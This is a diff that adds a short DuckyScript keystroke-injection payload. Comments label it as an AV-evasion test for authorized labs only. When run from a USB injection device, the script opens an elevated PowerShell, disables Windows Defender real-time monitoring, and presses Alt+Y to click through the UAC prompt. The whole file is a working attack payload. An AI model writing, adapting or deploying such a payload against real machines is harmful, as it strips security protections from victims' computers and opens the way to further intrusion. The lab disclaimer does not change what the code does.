@@ -1,0 +1,13 @@
+REM Disable Windows Defender - For testing AV evasion techniques
+REM Requires admin privileges - UAC bypass not included
+REM FOR AUTHORIZED TESTING IN LAB ENVIRONMENTS ONLY
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host Defender-Disabled'"
+ENTER
+DELAY 2000
+REM Click Yes on UAC prompt (requires left arrow + enter on some systems)
+ALT y
+DELAY 1000
